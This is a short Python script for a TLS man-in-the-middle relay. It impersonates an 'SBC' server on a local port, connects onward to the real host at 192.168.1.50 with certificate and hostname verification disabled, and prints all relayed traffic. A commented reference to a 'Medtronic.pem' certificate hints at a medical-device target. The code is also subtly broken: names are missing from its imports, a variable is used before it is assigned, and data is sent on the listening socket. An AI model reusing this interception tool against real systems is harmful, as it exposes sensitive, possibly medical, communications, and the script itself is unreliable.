from socket import socket, AF_INET, SOCK_STREAM
from socket import create_connection
from ssl import SSLContext, PROTOCOL_TLS_SERVER



# Configure  TLS Socket Server  and pretend to be SBC
context2Target = SSLContext(PROTOCOL_TLS_SERVER)
context2Target.load_cert_chain('cert.pem', 'key.pem')

# Create listening socket and fake SBC Host
with socket(AF_INET, SOCK_STREAM) as targetSocket:
    targetSocket.bind(('127.0.0.1', 4544))
    targetSocket.listen(1)
   
   # Wrap the socket  with SSL
    with context2Target.wrap_socket(targetSocket, server_side=True) as targetSSLSocket:
        targetConnection, targetAddress = targetSSLSocket.accept()
        
        # We have a TLS Connection Now, notify user and try to connect to real SBC
        print(f'TLS Connection from: {targetAddress}')




        # Configure connection with SBC System 
        context4SBC = SSLContext(PROTOCOL_TLS_CLIENT)
        #DISABLED# context4SBC.load_verify_locations('Medtronic.pem')
        context4SBC.check_hostname = False # Disable HostName Checking
        context4SBC.verify_mode = CERT_NONE # Disable Certificate Verification

        # create connection with SBC System)
        with create_connection(('192.168.1.50', 4544)) as sbcSocket:
            with context4SBC.wrap_socket(sbcSocket, '192.168.1.50', server_side=False ) as sbcSSLSocket:
                print(f'Using {sbcSSLSocket.version()}')

                
                while True:

                    # get data from the SBC
                    dataFromSBC = sbcSSLSocket.recv(1024)
                    print(f'SBC says: {dataFromTarget}')
                    
                    # forward data to the Target
                    targetSSLSocket.sendall(dataFromSBC)

                    # get data from the target
                    dataFromTarget = targetSSLSocket.recv(1024)
                    print(f'Target says: {dataFromTarget}')
                    
                    # forward data to the SBC
                    sbcSSLSocket.sendall(dataFromTarget)
                    